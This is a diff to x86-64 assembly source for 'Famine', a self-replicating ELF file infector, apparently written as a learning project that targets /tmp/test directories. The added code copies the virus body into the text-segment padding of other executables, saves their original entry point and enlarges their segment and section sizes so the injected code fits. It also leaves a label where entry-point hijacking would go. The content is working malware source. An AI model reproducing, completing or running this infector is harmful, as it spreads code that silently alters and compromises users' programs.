@@ -2,6 +2,7 @@ BITS 64
 
 %include "defines.s"
 virus_len equ _end - _start
+virus_lenq equ (_end - _start) / 8 + 1
 
 section .text
     global _start
@@ -84,10 +85,13 @@ end_readdir:
 ; [rsp + 0x58]  map
 ; [rsp + 0x60]  text_phdr
 ; [rsp + 0x68]  data_phdr
+; [rsp + 0x70]  old_entrypoint
+; [rsp + 0x78]  old_text_size
+; [rsp + 0x80]  base_payload_address
 infect:
     push    rbp
     mov     rbp, rsp
-    sub     rsp, 0x80
+    sub     rsp, 0x90
     mov     [rsp + 4], rdi
 
     mov     esi, O_RDWR
@@ -144,6 +148,8 @@ right_type_check:
 
     mov     rax, [rsp + 0x58]
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
+    mov     rdx, QWORD [rax + e_entry]
+    mov     [rsp + 0x70], rdx
 
     mov     rax, [rsp + 0x58]
     mov     r8, rax
@@ -155,10 +161,14 @@ loop_phdrs:
     jne     next_phdr
     cmp     [r8 + p_flags], DWORD PF_R | PF_X
     jne     comp_data
+save_text_infos:
     mov     [rsp + 0x60], r8
+    mov     rdx, QWORD [r8 + p_filesz]
+    mov     [rsp + 0x78], rdx
 comp_data:
     cmp     [r8 + p_flags], DWORD PF_R | PF_W
     jne     next_phdr
+save_data_infos:
     mov     [rsp + 0x68], r8
 next_phdr:
     inc     r10
@@ -176,21 +186,51 @@ check_text_padding:
     sub     rax, rbx
     cmp     rax, virus_len
     jle     remap_and_infect_data
-    mov     rdi, 1
-    lea     rsi, [rel text_str]
-    mov     rdx, text_str.len
-    mov     eax, SYS_WRITE
-    syscall
+
+    mov     rax, [rsp + 0x60]
+    mov     rdi, [rsp + 0x58]
+    add     rdi, [rax + p_offset]
+    add     rdi, [rax + p_filesz]
+    mov     rcx, virus_lenq
+    lea     rsi, [rel _start]
+copy_payload:
+    lodsq
+    stosq
+    loop    copy_payload
+increase_text_size:
+    mov     rax, [rsp + 0x60]
+    add     QWORD [rax + p_filesz], virus_len
+    add     QWORD [rax + p_memsz], virus_len
+
+increase_last_text_section_size:
+    mov     rax, [rsp + 0x58]
+    mov     rbx, [rax + e_shoff]
+    add     rbx, rax
+    mov     rdx, [rsp + 0x60]
+    mov     rdx, [rdx + p_offset]
+    add     rdx, QWORD [rsp + 0x78]
+    xor     r8, r8
+loop_sections:
+    mov     r9, QWORD [rbx + sh_offset]
+    add     r9, QWORD [rbx + sh_size]
+    cmp     r9, rdx
+    jne     next_section
+    add     QWORD [rbx + sh_size], virus_len
+    jmp     do_entrypoint_magic
+next_section:
+    inc     r8
+    cmp     r8w, [rax + e_shnum]
+    add     bx, [rax + e_shentsize]
+    jle     loop_sections
+
+do_entrypoint_magic:
+
     jmp     munmap_quit_infect
-; write_bss:
-;     mov     rax, [rsp + 0x68]
-;     mov     r8, [rax + p_memsz]
-;     sub     r8, [rax + p_filsz]
 
 remap_and_infect_data:
-    mov     rdi, 1
-    lea     rsi, [rel data_str]
-    mov     rdx, data_str.len
+    mov     edi, 1
+    lea     rsi, [rel data_tmp_text]
+    mov     rdx, data_tmp_text.len
     mov     eax, SYS_WRITE
     syscall
 
@@ -215,9 +255,8 @@ quit_infect:
 
     dir1: db "/tmp/test/", 0
     dir2: db "/tmp/test2/", 0
-    text_str: db "Infect in .text", 10
-    .len equ $ - text_str
-    data_str: db "Infect in .data", 10
-    .len equ $ - data_str
-
+    old_entry_code: TIMES 5 db 0
+    signature: db "Famine version 1.0 (c)oded by alagroy-", 0
+    data_tmp_text: db "Remapping and infecting .data", 10
+        .len: equ $ - data_tmp_text
 _end:
